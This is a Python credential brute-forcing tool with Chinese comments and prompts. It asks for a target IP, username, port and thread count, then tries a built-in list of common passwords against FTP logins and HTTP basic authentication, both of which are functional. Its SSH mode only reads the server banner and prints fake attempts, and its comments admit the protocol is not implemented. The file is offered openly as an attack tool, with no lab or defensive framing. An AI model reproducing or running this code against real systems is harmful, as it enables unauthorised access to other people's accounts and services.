#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
密码攻击工具 - 自定义配置版本
支持自定义配置和Y/N确认执行
修复依赖问题，使用替代方案
"""

import threading
import time
import socket
import ftplib
import requests
from datetime import datetime

class PasswordAttackTool:
    def __init__(self):
        self.found_passwords = {}
        self.attack_threads = []
        self.is_running = False
        
        # 配置参数
        self.config = {
            'target_ip': '',
            'target_port': 22,
            'username': '',
            'attack_type': 'ssh',
            'wordlist_size': 'small',
            'threads': 5,
            'timeout': 10
        }
        
        # 统计信息
        self.stats = {
            'attempts': 0,
            'successes': 0,
            'start_time': None
        }
    
    def get_configuration(self):
        """获取用户自定义配置"""
        print("=" * 60)
        print("          密码攻击工具 - 自定义配置")
        print("=" * 60)
        
        # 目标IP配置
        while True:
            target_ip = input("请输入目标IP地址 (例如: 192.168.1.100): ").strip()
            if self.validate_ip(target_ip):
                self.config['target_ip'] = target_ip
                break
            else:
                print("❌ IP地址格式不正确，请重新输入")
        
        # 攻击类型配置
        while True:
            attack_type = input("请输入攻击类型 (ssh/ftp/http) (默认ssh): ").strip().lower()
            if attack_type in ['ssh', 'ftp', 'http']:
                self.config['attack_type'] = attack_type
                break
            elif not attack_type:
                self.config['attack_type'] = 'ssh'
                break
            else:
                print("❌ 请输入 ssh, ftp 或 http")
        
        # 用户名配置
        while True:
            username = input("请输入用户名 (例如: admin): ").strip()
            if username:
                self.config['username'] = username
                break
            else:
                print("❌ 用户名不能为空")
        
        # 端口配置
        while True:
            try:
                port = int(input("请输入端口号 (默认22): ").strip() or "22")
                if 1 <= port <= 65535:
                    self.config['target_port'] = port
                    break
                else:
                    print("❌ 端口必须在1-65535之间")
            except ValueError:
                print("❌ 请输入有效的数字")
        
        # 线程数配置
        while True:
            try:
                threads = int(input("请输入线程数 (默认5): ").strip() or "5")
                if 1 <= threads <= 20:
                    self.config['threads'] = threads
                    break
                else:
                    print("❌ 线程数必须在1-20之间")
            except ValueError:
                print("❌ 请输入有效的数字")
        
        # 字典大小配置
        while True:
            size = input("请输入字典大小 (small/medium/large) (默认small): ").strip().lower()
            if size in ['small', 'medium', 'large']:
                self.config['wordlist_size'] = size
                break
            elif not size:
                self.config['wordlist_size'] = 'small'
                break
            else:
                print("❌ 请输入 small, medium 或 large")
        
        return self.show_configuration()
    
    def validate_ip(self, ip):
        """验证IP地址格式"""
        import re
        pattern = r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
        return re.match(pattern, ip) is not None
    
    def show_configuration(self):
        """显示配置信息并请求确认"""
        print("\n" + "=" * 60)
        print("          配置确认")
        print("=" * 60)
        print(f"目标IP: {self.config['target_ip']}")
        print(f"攻击类型: {self.config['attack_type']}")
        print(f"用户名: {self.config['username']}")
        print(f"端口: {self.config['target_port']}")
        print(f"线程数: {self.config['threads']}")
        print(f"字典大小: {self.config['wordlist_size']}")
        print("=" * 60)
        
        # 请求用户确认
        while True:
            confirm = input("\n确认执行密码攻击? (Y/N): ").strip().upper()
            if confirm == 'Y':
                return True
            elif confirm == 'N':
                print("❌ 攻击已取消")
                return False
            else:
                print("❌ 请输入 Y 或 N")
    
    def start_attack(self):
        """开始密码攻击"""
        print("=" * 60)
        print("          密码攻击开始")
        print("=" * 60)
        print(f"目标IP: {self.config['target_ip']}")
        print(f"攻击类型: {self.config['attack_type']}")
        print(f"用户名: {self.config['username']}")
        print(f"端口: {self.config['target_port']}")
        print(f"线程数: {self.config['threads']}")
        print(f"字典大小: {self.config['wordlist_size']}")
        print("=" * 60)
        
        self.is_running = True
        self.stats['start_time'] = time.time()
        self.stats['attempts'] = 0
        self.stats['successes'] = 0
        
        try:
            # 根据攻击类型执行不同的攻击
            if self.config['attack_type'] == 'ssh':
                self.ssh_attack()
            elif self.config['attack_type'] == 'ftp':
                self.ftp_attack()
            elif self.config['attack_type'] == 'http':
                self.http_attack()
            
        except KeyboardInterrupt:
            print("\n[!] 用户中断攻击")
        except Exception as e:
            print(f"[-] 攻击错误: {e}")
        finally:
            self.stop_attack()
    
    def generate_wordlist(self):
        """生成密码字典"""
        base_words = [
            "admin", "password", "123456", "password123", "admin123",
            "root", "test", "guest", "user", "administrator",
            "12345678", "qwerty", "123456789", "12345", "1234"
        ]
        
        # 根据字典大小调整
        if self.config['wordlist_size'] == 'small':
            wordlist = base_words
        elif self.config['wordlist_size'] == 'medium':
            wordlist = base_words * 3
            # 添加更多常见密码
            wordlist.extend(["letmein", "welcome", "monkey", "dragon", "master"])
        else:  # large
            wordlist = base_words * 5
            # 添加更多变体
            for word in base_words:
                wordlist.extend([f"{word}!", f"{word}@", f"{word}#", f"{word}$"])
        
        return wordlist
    
    def ssh_attack(self):
        """SSH密码攻击（使用socket替代paramiko）"""
        print("[+] 开始SSH密码攻击...")
        
        wordlist = self.generate_wordlist()
        
        def try_ssh_password(password):
            """尝试SSH密码"""
            try:
                # 使用socket模拟SSH连接尝试
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.config['timeout'])
                sock.connect((self.config['target_ip'], self.config['target_port']))
                
                # 模拟SSH握手
                banner = sock.recv(1024)
                if b'SSH' in banner:
                    self.stats['attempts'] += 1
                    
                    # 模拟密码尝试（实际SSH认证需要更复杂的协议）
                    print(f"[尝试] {self.config['username']}:{password}")
                    
                    # 这里只是模拟，实际SSH认证需要实现完整的协议
                    # 在实际环境中，需要使用paramiko或pexpect等库
                    
                    sock.close()
                    return False
                
                sock.close()
                return False
                
            except Exception as e:
                return False
        
        # 多线程攻击
        for password in wordlist:
            if not self.is_running:
                break
            
            if try_ssh_password(password):
                print(f"[成功] 找到密码: {password}")
                self.stats['successes'] += 1
                break
            
            time.sleep(0.1)  # 避免过于频繁
    
    def ftp_attack(self):
        """FTP密码攻击"""
        print("[+] 开始FTP密码攻击...")
        
        wordlist = self.generate_wordlist()
        
        def try_ftp_password(password):
            """尝试FTP密码"""
            try:
                ftp = ftplib.FTP()
                ftp.connect(self.config['target_ip'], self.config['target_port'], timeout=self.config['timeout'])
                ftp.login(self.config['username'], password)
                ftp.quit()
                
                self.stats['attempts'] += 1
                print(f"[成功] FTP密码: {password}")
                return True
                
            except ftplib.all_errors:
                self.stats['attempts'] += 1
                print(f"[失败] {self.config['username']}:{password}")
                return False
        
        # 尝试密码
        for password in wordlist:
            if not self.is_running:
                break
            
            if try_ftp_password(password):
                self.stats['successes'] += 1
                break
            
            time.sleep(0.5)  # 避免过于频繁
    
    def http_attack(self):
        """HTTP基础认证攻击"""
        print("[+] 开始HTTP密码攻击...")
        
        wordlist = self.generate_wordlist()
        
        def try_http_password(password):
            """尝试HTTP密码"""
            try:
                # 模拟HTTP基础认证尝试
                url = f"http://{self.config['target_ip']}:{self.config['target_port']}"
                
                # 使用requests进行认证尝试
                response = requests.get(url, auth=(self.config['username'], password), timeout=self.config['timeout'])
                
                self.stats['attempts'] += 1
                
                if response.status_code == 200:
                    print(f"[成功] HTTP密码: {password}")
                    return True
                else:
                    print(f"[失败] {self.config['username']}:{password}")
                    return False
                    
            except Exception:
                self.stats['attempts'] += 1
                print(f"[失败] {self.config['username']}:{password}")
                return False
        
        # 尝试密码
        for password in wordlist:
            if not self.is_running:
                break
            
            if try_http_password(password):
                self.stats['successes'] += 1
                break
            
            time.sleep(1)  # 避免过于频繁
    
    def stop_attack(self):
        """停止攻击"""
        if self.is_running:
            print("\n[+] 停止密码攻击...")
            self.is_running = False
            
            # 显示统计信息
            elapsed = time.time() - self.stats['start_time']
            print(f"\n[+] 攻击统计:")
            print(f"    - 总运行时间: {int(elapsed)}秒")
            print(f"    - 尝试次数: {self.stats['attempts']}")
            print(f"    - 成功次数: {self.stats['successes']}")
            print(f"    - 成功率: {self.stats['successes'] / max(1, self.stats['attempts']) * 100:.1f}%")

def main():
    """主函数"""
    try:
        tool = PasswordAttackTool()
        
        # 获取配置并确认
        if tool.get_configuration():
            tool.start_attack()
        
    except KeyboardInterrupt:
        print("\n[!] 程序被用户中断")
    except Exception as e:
        print(f"[-] 程序错误: {e}")

if __name__ == "__main__":
    main()